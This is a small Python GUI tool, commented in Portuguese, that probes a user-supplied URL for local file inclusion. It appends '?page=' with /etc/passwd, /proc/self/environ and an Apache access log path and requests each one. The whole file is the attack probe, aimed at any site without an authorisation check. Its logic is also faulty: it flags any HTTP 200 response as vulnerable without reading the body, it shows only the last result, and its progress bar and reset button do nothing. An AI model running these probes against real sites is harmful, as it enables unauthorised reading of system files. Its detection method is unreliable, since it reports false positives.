import tkinter as tk
from tkinter import ttk
import tkinter.font as font
import requests

def run_scan():
    # usuario informa a URL
    url = entry.get()
    
    # lista de arquivos para scan, vulnerabilidades LFI
    files = ["/etc/passwd", "/proc/self/environ", "/var/log/apache2/access.log"]
    
    # loop na lista de arquivos
    for file in files:
        # construindo a URL completa
        test_url = url + "?page=" + file
        # fazendo o request na URL
        response = requests.get(test_url)
        # checando o codigo de resposta do request
        if response.status_code == 200:
            # se a resposta for 200, o codigo é acessavel
            result_label.config(text=f"[+] VULNERÁVEL: {test_url}")
        else:
            # se o status nao for 200, o codigo não é acessavel
            result_label.config(text=f"[-] Não VULNERÁVEL: {test_url}")

# criando a janela GUI
root = tk.Tk()
root.geometry("650x200")
root.title("LFI Scanner")
root['bg'] = 'black'
# criando o input
url_label = tk.Label(root, text="URL:", bg='#000000', fg='#5bff45')
url_label.grid(row=0, column=0, sticky="W")

# criando a entrada de texto
entry = tk.Entry(root)
entry.grid(row=0, column=1)

# criando um botão pra começar o scan
myFont = font.Font(family='Courier', weight='bold')
scan_button = tk.Button(root, text="Scannear", command=run_scan, font=myFont, bg='#000000', fg='#5bff45', activebackground='#787878')
scan_button.grid(row=1, column=0, columnspan=2, pady=10)

#barra de progresso
pb = ttk.Progressbar(root, orient='horizontal', mode='indeterminate', length=280)

# botao de resetar o scanner
stop_button = tk.Button(root, text='Resetar',)

# criando um rotulo que mostra o resultado
result_label = tk.Label(root, text="",)
result_label.grid(row=2, column=0, columnspan=2, pady=10)

# startando a GUI
root.mainloop()
